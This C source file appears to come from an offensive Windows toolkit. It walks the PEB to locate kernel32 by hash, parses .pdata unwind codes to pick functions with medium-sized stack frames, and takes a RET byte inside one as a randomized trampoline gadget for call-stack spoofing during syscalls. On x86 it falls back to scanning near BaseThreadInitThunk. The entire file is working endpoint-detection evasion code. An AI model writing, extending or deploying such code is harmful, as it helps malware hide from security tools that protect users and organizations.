#include <sindri/common/debug.h>
#include <sindri/common/macros.h>
#include <sindri/common/status.h>
#include <sindri/parsers/env/peb.h>
#include <sindri/parsers/pe/exports.h>
#include <sindri/parsers/pe/parser.h>
#include <sindri/primitives/syscalls.h>
#include <sindri_hashes.h>
#include <windows.h>

snd_status_t snd_syscall_find_spoof_scan(snd_syscall_entry_t *entry) {
    if (entry == NULL) {
        return SND_ERR(SND_STATUS_NULL_POINTER);
    }

    PVOID kernel32 = NULL;

    snd_status_t status = snd_peb_get_module_base_hash(SND_HASH_KERNEL32_DLL, &kernel32);

    if (SND_FAILED(status)) {
        return SND_ERR(SND_STATUS_NOT_INITIALIZED);
    }

    PVOID gadget = NULL;

#ifdef _WIN64
    PIMAGE_DOS_HEADER dos        = (PIMAGE_DOS_HEADER)kernel32;
    PIMAGE_NT_HEADERS nt         = (PIMAGE_NT_HEADERS)((ULONG_PTR)kernel32 + dos->e_lfanew);
    DWORD             pdata_rva  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
    DWORD             pdata_size = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size;

    if (pdata_rva != 0 && pdata_size != 0) {
        PRUNTIME_FUNCTION pdata       = (PRUNTIME_FUNCTION)((ULONG_PTR)kernel32 + pdata_rva);
        DWORD             pdata_count = pdata_size / sizeof(RUNTIME_FUNCTION);

        // Simple randomizer using a static counter + hash + memory addresses for entropy
        static ULONG call_count = 0;
        ULONG        entropy    = (ULONG)((ULONG_PTR)kernel32 & 0xFFFFFFFF) ^ (ULONG)((ULONG_PTR)entry & 0xFFFFFFFF);
        ULONG        skip_count = (entry->dwHash + ++call_count + entropy) % 15; // Skip up to 14 fat frames
        ULONG        current_fat_frames = 0;

        PVOID fallback_gadget     = NULL;
        DWORD fallback_frame_size = 0;

        for (DWORD i = 0; i < pdata_count; i++) {
            PRUNTIME_FUNCTION func = &pdata[i];

            if (func->UnwindData == 0)
                continue;

            PBYTE unwind_info = (PBYTE)((ULONG_PTR)kernel32 + func->UnwindData);

            BYTE version = unwind_info[0] & 7;
            BYTE flags   = unwind_info[0] >> 3;

            if ((version != 1 && version != 2) || (flags & 4) != 0) {
                continue;
            }

            BYTE frameReg = unwind_info[3] & 0x0F;
            if (frameReg != 0) {
                continue; // Reject functions that use a frame pointer to prevent RtlVirtualUnwind desync
            }

            BYTE  countOfCodes = unwind_info[2];
            PBYTE codes        = unwind_info + 4;

            DWORD frame_size = 0;

            for (BYTE j = 0; j < countOfCodes;) {
                BYTE unwindOp = codes[j * 2 + 1] & 0x0F;
                BYTE opInfo   = codes[j * 2 + 1] >> 4;

                switch (unwindOp) {
                case 0: // UWOP_PUSH_NONVOL
                    frame_size += 8;
                    j += 1;
                    break;
                case 1: // UWOP_ALLOC_LARGE
                    if (opInfo == 0) {
                        frame_size += (*(USHORT *)(&codes[(j + 1) * 2])) * 8;
                        j += 2;
                    } else {
                        frame_size += (*(DWORD *)(&codes[(j + 1) * 2]));
                        j += 3;
                    }
                    break;
                case 2: // UWOP_ALLOC_SMALL
                    frame_size += (opInfo * 8) + 8;
                    j += 1;
                    break;
                case 3: // UWOP_SET_FPREG
                    j += 1;
                    break;
                case 4: // UWOP_SAVE_NONVOL
                    j += 2;
                    break;
                case 5: // UWOP_SAVE_NONVOL_FAR
                    j += 3;
                    break;
                case 8: // UWOP_SAVE_XMM128
                    j += 2;
                    break;
                case 9: // UWOP_SAVE_XMM128_FAR
                    j += 3;
                    break;
                case 10: // UWOP_PUSH_MACHFRAME
                    j += 1;
                    break;
                default:
                    j += 1;
                    break;
                }
            }

            if (frame_size >= 120 && frame_size <= 240) {
                PBYTE func_body = (PBYTE)((ULONG_PTR)kernel32 + func->BeginAddress);
                DWORD func_size = func->EndAddress - func->BeginAddress;

                for (DWORD k = 0; k < func_size; k++) {
                    if (func_body[k] == 0xC3) { // RET
                        gadget                  = &func_body[k];
                        entry->dwSpoofFrameSize = frame_size;
                        break;
                    }
                }

                if (gadget) {
                    if (!fallback_gadget) {
                        fallback_gadget     = gadget;
                        fallback_frame_size = frame_size;
                    }

                    if (current_fat_frames < skip_count) {
                        current_fat_frames++;
                        gadget = NULL; // Keep searching for the next one
                        continue;
                    }
                    break;
                }
            }
        }

        if (!gadget && fallback_gadget) {
            gadget                  = fallback_gadget;
            entry->dwSpoofFrameSize = fallback_frame_size;
        }
    }
#else
    FARPROC exec_addr = NULL;

    status = snd_pe_get_export_address_hash(kernel32, SND_SYS_DLL_SIZE_DEFAULT, SND_HASH_BASETHREADINITTHUNK,
                                            &exec_addr, NULL);

    if (SND_FAILED(status) || !exec_addr) {
        return SND_ERR(SND_STATUS_SSN_NOT_FOUND);
    }
    // x86 fallback: basic RET scan since there is no .pdata
    PBYTE scanner = (PBYTE)exec_addr;
    for (int i = 0; i < 65535; i++) {
        if (scanner[i] == 0xC3) { // ret
            gadget = &scanner[i];
            break;
        }
        if (scanner[-i] == 0xC3) { // ret
            gadget = &scanner[-i];
            break;
        }
    }
#endif

    if (!gadget) {
        return SND_ERR_CTX(SND_STATUS_GADGET_NOT_FOUND, "Could not find a trampoline gadget in kernel32.");
    }

    entry->pSpoofAddr = gadget;

    return SND_OK;
}
